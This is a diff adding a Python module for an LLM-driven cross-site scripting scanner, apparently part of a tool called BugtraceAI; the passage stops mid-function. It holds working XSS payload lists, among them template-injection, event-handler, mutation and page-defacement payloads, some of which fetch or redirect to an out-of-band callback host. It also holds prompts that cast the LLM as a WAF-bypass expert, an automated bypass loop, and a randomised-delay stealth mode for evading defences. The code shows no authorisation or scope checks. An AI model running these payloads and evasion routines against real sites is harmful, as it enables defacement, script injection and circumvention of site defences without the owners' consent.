@@ -1,0 +1,1018 @@
+"""
+XSSAgent V3 - LLM-Driven with Multi-Layer Validation
+
+This is a complete rewrite of the XSS detection agent using:
+1. LLM as the brain (analyzes HTML, decides payloads)
+2. Interactsh for OOB validation (definitive proof)
+3. Vision LLM for visual validation (screenshot analysis)
+4. CDP for DOM-based validation (fallback)
+
+Author: BugtraceAI Team
+Version: 3.0.0
+Date: 2026-01-10
+"""
+
+import asyncio
+import aiohttp
+from typing import Dict, List, Optional, Any
+from pathlib import Path
+from dataclasses import dataclass
+from enum import Enum
+
+from bugtrace.utils.logger import get_logger
+from bugtrace.core.config import settings
+from bugtrace.core.llm_client import llm_client
+from bugtrace.core.ui import dashboard
+from bugtrace.tools.interactsh import InteractshClient
+from bugtrace.tools.visual.verifier import XSSVerifier
+from bugtrace.memory.payload_learner import PayloadLearner
+
+logger = get_logger("agents.xss_v4")
+
+
+class ValidationMethod(Enum):
+    INTERACTSH = "interactsh"  # OOB callback - definitive
+    VISION = "vision"          # Screenshot analysis
+    CDP = "cdp"                # DOM marker check
+    
+
+@dataclass
+class XSSFinding:
+    """Represents a confirmed XSS vulnerability."""
+    url: str
+    parameter: str
+    payload: str
+    context: str
+    validation_method: str
+    evidence: Dict[str, Any]
+    confidence: float
+    screenshot_path: Optional[str] = None
+    reflection_context: Optional[str] = None # Shannon Context (e.g. html_text, script)
+    surviving_chars: Optional[str] = None    # Shannon Metadata (e.g. < > ")
+
+
+from bugtrace.agents.base import BaseAgent
+
+class XSSAgent(BaseAgent):
+    """
+    LLM-Driven XSS Agent with multi-layer validation.
+    
+    Flow:
+    1. Register with Interactsh (get callback URL)
+    2. Probe target to get HTML with reflection
+    3. LLM analyzes HTML and generates optimal payload
+    4. Send payload to target
+    5. Validate via Interactsh (primary) or Vision/CDP (fallback)
+    6. If failed, LLM generates bypass, repeat
+    """
+    
+    MAX_BYPASS_ATTEMPTS = 6
+    # Multi-Stage Probe (Shannon Pattern): Tests for characters: ' " < > &
+    # CSTI/Template Injection Support added to Probe
+    PROBE_STRING = "BT7331'\"<>&{}"
+    
+    # Elite payloads that bypass many WAFs and target modern frameworks (like Angular)
+    GOLDEN_PAYLOADS = [
+        "{{7*7}}", # Angular CSTI Check (Arithmetic)
+        "{{constructor.constructor('var b=document.createElement(\"div\");b.id=\"bt-pwn\";b.style=\"background:red;color:white;text-align:center;padding:10px;position:fixed;top:0;left:0;width:100%;z-index:9999;font-weight:bold;\";b.innerText=\"HACKED BY BUGTRACEAI\";document.body.prepend(b);')()}}", # Visual Defacement
+        "\\\";var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);//", # Backslash Breakout Visual
+        "\"><img src=x onerror=var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)>", # Attribute Breakout Visual
+        "{{constructor.constructor('fetch(\"https://{{interactsh_url}}\")')()}}", # Angular 1.6+
+        "<svg/onload=var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)>", # SVG Visual
+        "\"><svg/onload=var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)>", # SVG Attribute Breakout (Standard)
+        "\"><svg/onload=document.body.appendChild(document.createElement('div')).id='bt-pwn'>", # SVG Zero-Space (Race.es Killer)
+        "\"><svg/onload=fetch('https://{{interactsh_url}}')>", # SVG Space-less (Race.es Bypass)
+        "\"><svg/onload=document.location='https://{{interactsh_url}}'>", # SVG Redirect (Race.es Aggressive)
+        "\"><iframe src=javascript:alert(document.domain)>", # Iframe Protocol Bypass (Proven Winner)
+        "javascript:var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)//", # Protocol Visual
+        "';var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);//", # Semicolon Breakout Visual
+        "\\';alert(document.domain)//",
+        "<details open ontoggle=fetch('https://{{interactsh_url}}')>"
+    ]
+    
+    # Fragment-based payloads (DOM XSS via location.hash → innerHTML)
+    # These bypass WAFs that filter query params but allow hash fragments
+    FRAGMENT_PAYLOADS = [
+        "<img src=x onerror=alert(1)>", # Simple alert for Level 7
+        "<img src=x onerror=fetch('https://{{interactsh_url}}')>",
+        "<img src=x onerror=var b=document.createElement('div');b.id='bt-pwn';b.innerText='FRAGMENT XSS';document.body.prepend(b)>",
+        "<svg/onload=fetch('https://{{interactsh_url}}')>",
+        "<svg/onload=var b=document.createElement('div');b.id='bt-pwn';b.innerText='FRAGMENT XSS';document.body.prepend(b)>",
+        "<iframe src=javascript:fetch('https://{{interactsh_url}}')>",
+        "<details open ontoggle=fetch('https://{{interactsh_url}}')>",
+        "<body onload=fetch('https://{{interactsh_url}}')>",
+        "<marquee onstart=fetch('https://{{interactsh_url}}')>",
+        # mXSS mutation payloads (Level 8)
+        "<svg><style><img src=x onerror=fetch('https://{{interactsh_url}}')>",
+        "<noscript><p title=\"</noscript><img src=x onerror=fetch('https://{{interactsh_url}}')>\">",
+        "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=</style><img src=x onerror=fetch('https://{{interactsh_url}}')>",
+    ]
+    
+    def __init__(
+        self,
+        url: str,
+        params: List[str] = None,
+        report_dir: Path = None,
+        headless: bool = True,
+        event_bus: Any = None
+    ):
+        super().__init__("XSSAgentV4", "XSS Specialist (Phoenix Edition)", event_bus, agent_id="xss_agent_v4")
+        self.url = url
+        self.params = params or []
+        self.report_dir = report_dir or Path("./reports")
+        self.headless = headless
+        
+        # Tools
+        self.interactsh: Optional[InteractshClient] = None
+        # Force validation to use Playwright first (prefer_cdp=False) so we always run all methods
+        self.verifier = XSSVerifier(headless=headless, prefer_cdp=False)
+        self.payload_learner = PayloadLearner()
+        
+        # Results
+        self.findings: List[XSSFinding] = []
+        self.interactsh = None
+        
+        # WAF AWARENESS & STEALTH
+        self.consecutive_blocks = 0
+        self.stealth_mode = False
+        self.last_request_time = 0
+        
+    async def run_loop(self) -> Dict:
+        """Main entry point for XSS scanning."""
+        dashboard.current_agent = self.name
+        dashboard.log(f"[{self.name}] 🚀 Starting LLM-driven XSS analysis on {self.url}", "INFO")
+        
+        screenshots_dir = self.report_dir / "screenshots"
+        screenshots_dir.mkdir(parents=True, exist_ok=True)
+        
+        try:
+            # Phase 1: Setup Interactsh
+            dashboard.log(f"[{self.name}] 📡 Registering with Interactsh...", "INFO")
+            logger.info(f"[{self.name}] Phase 1: Registering with Interactsh")
+            self.interactsh = InteractshClient()
+            # Safety Wrapper: Registering Interactsh
+            await self.exec_tool("Interactsh_Register", self.interactsh.register, timeout=30)
+            interactsh_domain = self.interactsh.get_url("xss_agent_base")
+            dashboard.log(f"[{self.name}] ✓ Interactsh ready: {interactsh_domain}", "SUCCESS")
+            # logger.info(f"[{self.name}] Interactsh ready: {interactsh_domain}")
+            
+            # Phase 2: Discover params if not provided
+            if not self.params:
+                dashboard.log(f"[{self.name}] 🔎 Discovering parameters...", "INFO")
+                logger.info(f"[{self.name}] Phase 2: Discovering parameters")
+                self.params = await self._discover_params()
+                logger.info(f"[{self.name}] Discovered {len(self.params)} params")
+                
+            if not self.params:
+                dashboard.log(f"[{self.name}] ⚠️ No parameters found to test", "WARN")
+                return {"findings": [], "message": "No parameters found"}
+            
+            dashboard.log(f"[{self.name}] Testing {len(self.params)} params: {', '.join(self.params[:5])}", "INFO")
+            logger.info(f"[{self.name}] Phase 3: Testing each parameter")
+            for param in self.params:
+                finding = await self._test_parameter(param, interactsh_domain, screenshots_dir)
+                if finding:
+                    self.findings.append(finding)
+                    dashboard.log(f"[{self.name}] 🎯 XSS CONFIRMED on '{param}'!", "SUCCESS")
+            
+            # Phase 4: Cleanup
+            if self.interactsh:
+                await self.interactsh.deregister()
+            
+            # Return results
+            validated_count = len(self.findings)
+            dashboard.log(f"[{self.name}] ✅ Scan complete. {validated_count} XSS found.", "SUCCESS")
+            
+            return {
+                "findings": [self._finding_to_dict(f) for f in self.findings],
+                "validated_count": validated_count,
+                "params_tested": len(self.params)
+            }
+            
+        except Exception as e:
+            logger.exception(f"XSSAgent error: {e}")
+            dashboard.log(f"[{self.name}] ❌ Error: {e}", "ERROR")
+            return {"findings": [], "error": str(e)}
+    
+    async def _test_parameter(
+        self,
+        param: str,
+        interactsh_domain: str,
+        screenshots_dir: Path
+    ) -> Optional[XSSFinding]:
+        """Test a single parameter for XSS."""
+        dashboard.log(f"[{self.name}] 🔬 Testing param: {param}", "INFO")
+        dashboard.set_status("XSS Analysis", f"Testing {param}")
+        
+        # Step 1: Probe to get HTML with reflection and analyze context (Shannon Phase)
+        html, probe_url = await self._probe_parameter(param)
+
+        waf_detected = False
+        if html == "":
+            dashboard.log(f"[{self.name}] 🛡️ WAF Detected (Probe Blocked). Switching to Direct Fire Strategy.", "WARN")
+            waf_detected = True
+            # Fake HTML for analysis to proceed partially
+            html = "<html><body>WAF_BLOCKED_PROBE</body></html>"
+        
+        if html is None: # Hard failure (e.g. network down), not WAF
+             return None
+            
+        # ANALYZE GLOBAL CONTEXT (SNIPER MODE)
+        global_context = self._analyze_global_context(html)
+        dashboard.log(f"[{self.name}] 🌍 Global Context: {global_context}", "INFO")
+            
+        # Analyze reflection (Shannon Context Mapping)
+        context_data = self._analyze_reflection_context(html, self.PROBE_STRING)
+        context_data["global_context"] = global_context
+        
+        if not context_data.get("reflected"):
+            dashboard.log(f"[{self.name}] ⚠️ '{param}' not reflected in raw HTML. Trying Golden Payloads for DOM/Blind XSS...", "WARN")
+            reflection_type = "unknown (potential DOM XSS)"
+            surviving_chars = "unknown"
+        else:
+            reflection_type = context_data.get("context", "unknown")
+            surviving_chars = context_data.get("surviving_chars", "")
+            dashboard.log(f"[{self.name}] ✓ Reflection found for '{param}' in <{reflection_type}> context", "INFO")
+        logger.info(f"[{self.name}] Context: {reflection_type}, Surviving: {surviving_chars}")
+        
+        # Step 2: Try HYBRID PAYLOADS (Learned + Curated + Golden)
+        # Use a safe label for tracking
+        label = f"xss_{param}".replace("-", "").replace("_", "")[:20]
+        interactsh_url = self.interactsh.get_payload_url("xss", param)
+        
+        # Get prioritized list from memory
+        raw_payloads = self.payload_learner.get_prioritized_payloads(self.GOLDEN_PAYLOADS)
+        
+        # APPLY SMART CONTEXT FILTERING (Speed optimization)
+        hybrid_payloads = self._filter_payloads_by_context(raw_payloads, reflection_type)
+        
+        logger.info(f"[{self.name}] ⚡ Fast-Tracking {len(hybrid_payloads)}/{len(raw_payloads)} Payloads for {param}...")
+        dashboard.log(f"[{self.name}] ⚡ Fast-Tracking {len(hybrid_payloads)}/{len(raw_payloads)} Payloads for {param}...", "INFO")
+        
+        for gp_template in hybrid_payloads:
+            # ADAPTIVE DELAY (Stealth Mode)
+            if self.stealth_mode:
+                import random
+                wait_time = random.uniform(2.0, 5.0)
+                logger.debug(f"Stealth Mode: Waiting {wait_time:.2f}s...")
+                await asyncio.sleep(wait_time)
+
+            payload = gp_template.replace("{{interactsh_url}}", interactsh_url)
+            dashboard.set_current_payload(payload[:60], "XSS Hybrid", "Fast-Checking")
+            
+            # RAPID CHECK: Send HTTP request first (Fast Fail)
+            response_html = await self._send_payload(param, payload)
+            
+            # Check 1: Reflected?
+            # We assume if it's not reflected in raw HTML, browser won't execute it (unless DOM XSS which is handled by specific payloads)
+            # Exception: payloads that handle blind XSS (already using interactsh)
+            reflected = payload in response_html
+            
+            # Check 2: OOB Hit? (Async check - might be too fast here, but we check later)
+            # Real-time OOB check logic is tricky without waiting. 
+            # We rely on reflection as primary gate for non-blind payloads.
+            
+            if reflected:
+                dashboard.log(f"[{self.name}] 🔍 Reflection confirmed! Launching browser validation for: {payload[:40]}", "INFO")
+                # For Reflected Payloads, we validate in browser.
+                validated, evidence = await self.exec_tool(
+                    "Validation_Golden",
+                    self._validate,
+                    param, 
+                    payload, 
+                    response_html, 
+                    "interactsh",
+                    screenshots_dir,
+                    timeout=45, 
+                    default_return=(False, {})
+                )
+                
+                if validated:
+                    dashboard.log(f"[{self.name}] 🏆 HYBRID PAYLOAD SUCCESS: {payload[:30]}...", "SUCCESS")
+                    # LEARN: Save success to memory
+                    self.payload_learner.save_success(gp_template, reflection_type, self.url)
+                    
+                    return XSSFinding(
+                        url=self.url,
+                        parameter=param,
+                        payload=payload,
+                        context="hybrid_payload",
+                        validation_method="interactsh",
+                        evidence=evidence,
+                        confidence=1.0,
+                        screenshot_path=evidence.get("screenshot_path"),
+                        reflection_context=reflection_type,
+                        surviving_chars=surviving_chars
+                    )
+            else:
+                 # Not reflected? Move to next. Speed is key.
+                 pass
+
+        # Step 2.5: Fragment-Based XSS (Level 7+ Bypass)
+        # Activate if: (1) WAF detected, (2) No reflection, OR (3) After trying most golden payloads
+        should_try_fragment = (
+            self.consecutive_blocks > 2 or 
+            not context_data.get("reflected") or
+            waf_detected
+        )
+        
+        if should_try_fragment:
+            dashboard.log(f"[{self.name}] 🔗 Trying FRAGMENT XSS (DOM bypass via location.hash)...", "WARN")
+            
+            fragment_finding = await self._test_fragment_xss(param, interactsh_url, screenshots_dir)
+            if fragment_finding:
+                return fragment_finding
+
+        # Step 3: LLM analyzes and generates payload (Fallback if Golden + Fragment failed)
+        # Passing context data to LLM for precise reasoning (Shannon Style)
+        llm_response = await self.exec_tool("LLM_Analysis", self._llm_analyze, html, param, interactsh_url, context_data, timeout=250)
+        
+        if not llm_response:
+            logger.warning(f"[{self.name}] LLM Analysis failed (returned None).")
+            return None
+            
+        if not llm_response.get("vulnerable"):
+            dashboard.log(f"[{self.name}] LLM says not vulnerable: {llm_response.get('reasoning', 'N/A')}", "INFO")
+            return None
+        
+        payload = llm_response.get("payload", "")
+        validation_method = llm_response.get("validation_method", "interactsh")
+        
+        dashboard.log(f"[{self.name}] 🤖 LLM generated payload ({llm_response.get('context')})", "INFO")
+        dashboard.set_current_payload(payload[:60], "XSS", "Testing")
+        
+        # Step 3: Send payload
+        response_html = await self._send_payload(param, payload)
+        if not response_html:
+            logger.warning(f"[{self.name}] 🛡️ SENTINEL: No response from target. Target might be down or WAF killed the connection.")
+            return None
+            
+        # PREDICATE CHECK: Verify artifact reflection (Shannon Pattern)
+        # ONLY a warning now, does NOT block execution. 
+        # We check both the full payload and the callback host.
+        callback_host = interactsh_url.split('/')[0] if '/' in interactsh_url else interactsh_url
+        sentinel_hit = payload not in response_html and callback_host not in response_html
+            
+        if sentinel_hit:
+            logger.info(f"[{self.name}] 🛡️ SENTINEL: Markers not found in raw HTML. Proceeding with browser validation (could be encoded/dynamic).")
+        else:
+            logger.info(f"[{self.name}] 🛡️ SENTINEL: Reflection confirmed in raw response.")
+
+        # Step 4: Validate
+        dashboard.log(f"[{self.name}] 🔍 Validating LLM payload...", "INFO")
+        validated, evidence = await self.exec_tool(
+            "Validation_Phase",
+            self._validate,
+            param, 
+            payload, 
+            response_html, 
+            validation_method,
+            screenshots_dir,
+            timeout=120, 
+            default_return=(False, {})
+        )
+        
+        if validated:
+            return XSSFinding(
+                url=self.url,
+                parameter=param,
+                payload=payload,
+                context=llm_response.get("context", "unknown"),
+                validation_method=validation_method,
+                evidence=evidence,
+                confidence=llm_response.get("confidence", 0.9),
+                screenshot_path=evidence.get("screenshot_path"),
+                reflection_context=reflection_type,
+                surviving_chars=surviving_chars
+            )
+        
+        # Step 5: Bypass attempts if initial payload failed
+        for attempt in range(self.MAX_BYPASS_ATTEMPTS):
+            dashboard.log(f"[{self.name}] 🔄 Bypass attempt {attempt + 1}/{self.MAX_BYPASS_ATTEMPTS}", "INFO")
+            
+            bypass_response = await self._llm_generate_bypass(
+                payload, 
+                response_html[:50000],
+                interactsh_url
+            )
+            
+            if not bypass_response or not bypass_response.get("bypass_payload"):
+                break
+                
+            bypass_payload = bypass_response.get("bypass_payload")
+            dashboard.set_current_payload(bypass_payload[:60], "XSS Bypass", "Testing")
+            
+            response_html = await self._send_payload(param, bypass_payload)
+            validated, evidence = await self.exec_tool(
+                "Validation_Bypass",
+                self._validate,
+                param,
+                bypass_payload,
+                response_html,
+                validation_method,
+                screenshots_dir,
+                timeout=120,
+                default_return=(False, {})
+            )
+            
+            if validated:
+                return XSSFinding(
+                    url=self.url,
+                    parameter=param,
+                    payload=bypass_payload,
+                    context=llm_response.get("context", "unknown") + " (bypassed)",
+                    validation_method=validation_method,
+                    evidence=evidence,
+                    confidence=bypass_response.get("confidence", 0.8),
+                    screenshot_path=evidence.get("screenshot_path"),
+                    reflection_context=reflection_type,
+                    surviving_chars=surviving_chars
+                )
+        
+        # If we reach here, we exhausted all bypass attempts.
+        dashboard.log(f"[{self.name}] ❌ No XSS on '{param}' after {self.MAX_BYPASS_ATTEMPTS} bypass attempts", "WARN")
+        
+        # FEATURE: Mark as Resilient Target if WAF was detected or context was reflected but blocked
+        if reflection_type != "unknown" and surviving_chars != "unknown":
+            dashboard.log(f"[{self.name}] 🛡️ RESILIENT TARGET IDENTIFIED: '{param}' reflected input but blocked all payloads.", "WARN")
+            logger.warning(f"RESILIENT TARGET: {param} - Context: {reflection_type}, Survivors: {surviving_chars}, Attempts: {self.MAX_BYPASS_ATTEMPTS + 1}")
+            # Optional: We could return a "Low" severity info finding here in future versions.
+            
+        return None
+    
+    def _clean_payload(self, payload: str, param: str) -> str:
+        """
+        Cleans the payload by removing common hallucinations and LLM pollution.
+        """
+        if not payload:
+            return ""
+            
+        import re
+        cleaned = payload.strip()
+        
+        # 1. Remove Markdown code blocks (```javascript ... ``` or ```html ... ```)
+        cleaned = re.sub(r'```[a-z]*\n?(.*?)\n?```', r'\1', cleaned, flags=re.DOTALL)
+        
+        # 2. Remove inline code backticks
+        cleaned = cleaned.strip('`')
+        
+        # 3. Remove common prefixes like "Payload:", "Vector:", "**Second**:", etc.
+        cleaned = re.sub(r'^(payload|vector|bypass|solution|new payload|\*\*.*?\*\*)\s*:\s*', '', cleaned, flags=re.IGNORECASE)
+        
+        # 4. Remove param prefix hallucination (e.g. searchTerm=...)
+        param_pattern = re.compile(f"^{re.escape(param)}=", re.IGNORECASE)
+        cleaned = param_pattern.sub("", cleaned).strip()
+        
+        # 5. Remove any leftover XML tags that XmlParser might have missed in a messy response
+        cleaned = re.sub(r'</?payload>', '', cleaned, flags=re.IGNORECASE)
+        
+        # 6. Final strip of quotes
+        if (cleaned.startswith('"') and cleaned.endswith('"')) or \
+           (cleaned.startswith("'") and cleaned.endswith("'")):
+            cleaned = cleaned[1:-1]
+            
+        return cleaned
+
+    async def _probe_parameter(self, param: str) -> tuple:
+        """Send probe string and get HTML response."""
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+        
+        parsed = urlparse(self.url)
+        params = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(parsed.query).items()}
+        params[param] = self.PROBE_STRING
+        
+        probe_url = urlunparse((
+            parsed.scheme, parsed.netloc, parsed.path,
+            parsed.params, urlencode(params), parsed.fragment
+        ))
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
+        }
+        
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(probe_url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
+                    html = await resp.text()
+                    logger.info(f"[{self.name}] Probe status: {resp.status} for {probe_url}")
+                    return html, probe_url
+        except Exception as e:
+            logger.warning(f"[{self.name}] Probe failed (WAF suspected) for {probe_url}: {e}")
+            # If probe fails (WAF drops connection or blocks), we return specific flags
+            # allowing the main loop to try "Stealth Mode" or "Blind Golden Payloads"
+            # Return empty HTML but valid URL to ensure the loop continues
+            return "", probe_url
+
+    def _analyze_reflection_context(self, html: str, probe_prefix: str) -> Dict:
+        """
+        Analyze the reflection point of the probe.
+        Inspired by Shannon's Context Analysis.
+        """
+        from bs4 import BeautifulSoup
+        
+        # Check if probe (or prefix) is even there
+        prefix = "BT7331"
+        if prefix not in html:
+            return {"reflected": False}
+            
+        # Detect surviving characters
+        test_chars = ["'", "\"", "<", ">", "&", "{", "}", "\\"]
+        surviving = ""
+        for char in test_chars:
+            if f"{prefix}{char}" in html:
+                surviving += char
+        
+        # Find context via BeautifulSoup
+        context = "unknown"
+        try:
+            soup = BeautifulSoup(html, 'html.parser')
+            # Search in text nodes
+            text_node = soup.find(string=lambda t: t and prefix in t)
+            if text_node:
+                parent = text_node.parent.name
+                if parent in ['script', 'style']:
+                    context = parent
+                else:
+                    context = "html_text"
+            else:
+                # Search in attributes (Heuristic)
+                if f"={prefix}" in html or f"=\"{prefix}" in html or f"='{prefix}" in html:
+                    context = "attribute_value"
+                elif f"<!-- {prefix}" in html or f"<!--{prefix}" in html:
+                    context = "comment"
+                elif f"<{prefix}" in html:
+                    context = "tag_name"
+        except:
+             pass
+        
+        return {
+            "reflected": True,
+            "context": context,
+            "probe_found": True
+        }
+    def _filter_payloads_by_context(self, payloads: List[str], context: str) -> List[str]:
+        """
+        Filters and prioritizes payloads based on the detected reflection context.
+        This prevents testing 800+ payloads when only ~50 are relevant.
+        """
+        if context == "unknown":
+            # For unknown/DOM contexts, we want to try a broader set of elite payloads
+            return payloads[:50]
+
+        filtered = []
+        
+        for p in payloads:
+            p_lower = p.lower()
+            relevant = False
+            
+            if context == "script":
+                # Must breakout of JS string or close tag
+                # Also include "Killer Payloads" that might work (like escapes)
+                if any(x in p for x in ["'", "\"", "</script>", ";", "-", "+", "*", "\\"]):
+                    relevant = True
+                # Exclude pure HTML tags like <marquee> if they don't have a leading quote/tag-close
+                if p.startswith("<") and not p.lower().startswith("</script>"):
+                    relevant = False
+                # Re-allow if it has a quote before the tag (breakout)
+                if any(p.startswith(q) for q in ["'", "\"", "'; ", "\"; "]):
+                    relevant = True
+                    
+            
+            elif context == "html_text":
+                # Needs tags or breakout
+                if any(p.startswith(x) for x in ["<", "\">", "'>", "{{", "[["]):
+                    relevant = True
+            
+            elif context == "attribute_value":
+                # Event handlers or breakout
+                if any(p_lower.startswith(x) for x in ["on", "\"", "'", " javascript:", "data:"]):
+                    relevant = True
+            
+            elif context == "comment":
+                if "-->" in p or "--!>" in p:
+                    relevant = True
+            
+            elif context == "style":
+                if any(x in p for x in ["</style>", "expression", "url", "'", "\""]):
+                    relevant = True
+            
+            elif context == "tag_name":
+                if any(x in p for x in [" ", ">", "/"]):
+                    relevant = True
+            
+            if relevant:
+                filtered.append(p)
+        
+        # Always keep the top 10 "Killer Payloads" regardless of context as a safety net
+        # but place them after context-relevant ones if they didn't match
+        safety_net = payloads[:10]
+        for sn in safety_net:
+            if sn not in filtered:
+                filtered.append(sn)
+        
+        # Limit to 100 max to keep it fast
+        return filtered[:100]
+
+
+    def _analyze_global_context(self, html: str) -> str:
+        """
+        Analyze the full HTML for global technology signatures (Angular, React, Vue, jQuery).
+        This provides 'Sniper' context for frameworks.
+        """
+        if not html:
+            return "No HTML content"
+            
+        context = []
+        lower_html = html.lower()
+        
+        # AngularJS 1.x
+        if "ng-app" in lower_html or "angular.js" in lower_html or "angular.min.js" in lower_html or "angular_1" in lower_html:
+            context.append("AngularJS (CSTI Risk!)")
+            
+        # React
+        if "react" in lower_html and "component" in lower_html:
+            context.append("React")
+            
+        # Vue
+        if "vue.js" in lower_html or "vue.min.js" in lower_html or "v-if" in lower_html:
+            context.append("Vue.js")
+            
+        # jQuery
+        if "jquery" in lower_html:
+            context.append("jQuery")
+            
+        return ", ".join(context) if context else "Vanilla JS / Unknown"
+    
+    async def _llm_analyze(self, html: str, param: str, interactsh_url: str, context_data: Dict = None) -> Optional[Dict]:
+        """Ask LLM to analyze HTML and generate payload."""
+        import json
+        context_str = json.dumps(context_data or {}, indent=2)
+        
+        master_prompt = """You are an elite XSS (Cross-Site Scripting) expert (Shannon/CAI V4 Level).
+Analyze the provided HTML and the reflection context metadata.
+Your goal is to generate a payload that will execute JavaScript.
+The payload MUST include this callback URL for validation: {interactsh_url}
+
+REFLECTION CONTEXT METADATA:
+{context_data}
+
+Rules:
+1. If reflection is in 'html_text', use tags like <svg/onload=...> or <img src=x onerror=...>.
+2. If reflection is in 'attribute_value', try to break out using "> or '>.
+3. If reflection is in 'script' context, try to break out using '; or "; or use template literals.
+4. ONLY generate a payload if the 'surviving_chars' allow for the necessary breakout.
+5. If major characters like < or > are missing, try event handlers or javascript: pseudo-protocol if applicable.
+
+Response Format (XML-Like):
+<thought>Analysis of the context and why the chosen payload will work</thought>
+<payload>The payload string</payload>
+<validation_method>interactsh OR vision OR cdp</validation_method>
+<context>Description of target context (e.g., inside href, between tags)</context>
+<confidence>0.0 to 1.0</confidence>
+"""
+
+        if self.system_prompt:
+             parts = self.system_prompt.split("# XSS Bypass Prompt")
+             master_prompt = parts[0].replace("# Master XSS Analysis Prompt", "").strip()
+             master_prompt += f"\n\nREFLECTION CONTEXT METADATA:\n{context_str}"
+
+        # Safer generic replacement
+        system_prompt = master_prompt.replace("{interactsh_url}", interactsh_url) \
+                                     .replace("{probe}", self.PROBE_STRING) \
+                                     .replace("{PROBE}", self.PROBE_STRING) \
+                                     .replace("{context_data}", context_str)
+        
+        user_prompt = f"""Target URL: {self.url}
+Parameter: {param}
+Probe: {self.PROBE_STRING}
+Interactsh: {interactsh_url}
+
+HTML Reflection Source (truncated):
+```html
+{html[:12000]}
+```
+
+Generate the OPTIMAL XSS payload based on the metadata and HTML.
+"""
+        
+        try:
+            response = await llm_client.generate(
+                prompt=user_prompt,
+                module_name="XSS_AGENT",
+                system_prompt=system_prompt,
+                model_override=settings.MUTATION_MODEL,
+                max_tokens=8000 # Increased for reasoning models
+            )
+            
+            # DEBUG: Log raw response to see what LLM is actually generating
+            logger.info(f"LLM Raw Response ({len(response)} chars)")
+            
+            # Robust XML Parsing
+            from bugtrace.utils.parsers import XmlParser
+            tags = ["payload", "validation_method", "context", "confidence"]
+            data = XmlParser.extract_tags(response, tags)
+            
+            if data.get("payload"):
+                cleaned_payload = self._clean_payload(data["payload"], param)
+                return {
+                    "vulnerable": True,
+                    "payload": cleaned_payload,
+                    "validation_method": data.get("validation_method", "interactsh"),
+                    "context": data.get("context", "LLM Generated"),
+                    "confidence": float(data.get("confidence", 0.9))
+                }
+            
+            # Fallback for non-XML compliant models (Regex-based search for common patterns)
+            if "alert(" in response or "fetch(" in response:
+                logger.warning(f"[{self.name}] LLM failed XML tags but returned code. Attempting to extract payload manually.")
+                # Look for the last line that looks like a payload
+                lines = [l.strip() for l in response.strip().split("\n") if l.strip()]
+                for line in reversed(lines):
+                    if "alert(" in line or "fetch(" in line:
+                        cleaned = self._clean_payload(line, param)
+                        return {
+                            "vulnerable": True,
+                            "payload": cleaned,
+                            "validation_method": "interactsh",
+                            "context": "Heuristic Extraction",
+                            "confidence": 0.5
+                        }
+            return None
+            
+        except Exception as e:
+            logger.error(f"LLM analysis failed: {e}")
+            return None
+    
+    async def _llm_generate_bypass(self, previous_payload: str, response_snippet: str, interactsh_url: str) -> Optional[Dict]:
+        """Ask LLM to generate bypass payload."""
+        bypass_prompt_template = """The previous payload did not trigger a callback.
+Previous payload: {previous_payload}
+HTTP Response: {response_snippet}
+Analyze why it failed and generate a BYPASS payload with {interactsh_url}.
+
+Response Format (XML-Like):
+<thought>Analysis of failure</thought>
+<bypass_payload>New payload to try</bypass_payload>
+<confidence>0.1 to 1.0</confidence>
+"""
+
+        if self.system_prompt and "# XSS Bypass Prompt" in self.system_prompt:
+             bypass_prompt_template = self.system_prompt.split("# XSS Bypass Prompt")[1].strip()
+
+        prompt = bypass_prompt_template.replace("{previous_payload}", previous_payload) \
+                                       .replace("{response_snippet}", response_snippet[:3000]) \
+                                       .replace("{interactsh_url}", interactsh_url)
+        
+        try:
+            response = await llm_client.generate(
+                prompt=prompt,
+                module_name="XSS_AGENT_BYPASS",
+                system_prompt="You are a WAF bypass expert. Respond ONLY in XML tags: <bypass_payload>, <confidence>.",
+                model_override=settings.MUTATION_MODEL,
+            )
+            
+            from bugtrace.utils.parsers import XmlParser
+            tags = ["bypass_payload", "confidence"]
+            data = XmlParser.extract_tags(response, tags)
+            
+            if data.get("bypass_payload"):
+                data["bypass_payload"] = self._clean_payload(data["bypass_payload"], "fake") # we clean but without specific param if unknown
+                return data
+            return None
+            
+        except Exception as e:
+            logger.error(f"LLM bypass generation failed: {e}")
+            return None
+    
+    async def _send_payload(self, param: str, payload: str) -> str:
+        """Send XSS payload to target with WAF awareness."""
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+        import aiohttp
+        
+        parsed = urlparse(self.url)
+        params = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(parsed.query).items()}
+        params[param] = payload
+        
+        attack_url = urlunparse((
+            parsed.scheme, parsed.netloc, parsed.path,
+            parsed.params, urlencode(params), parsed.fragment
+        ))
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        }
+        
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(attack_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                    # Reset block counter on success (if not a 403)
+                    if resp.status == 200:
+                        if self.consecutive_blocks > 0:
+                            logger.info(f"[{self.name}] Target responded 200. Recovering...")
+                        self.consecutive_blocks = 0
+                    elif resp.status in [403, 406, 501]:
+                        self.consecutive_blocks += 1
+                        logger.warning(f"[{self.name}] Potential WAF Block ({resp.status}). Counter: {self.consecutive_blocks}")
+                    
+                    return await resp.text()
+        except Exception as e:
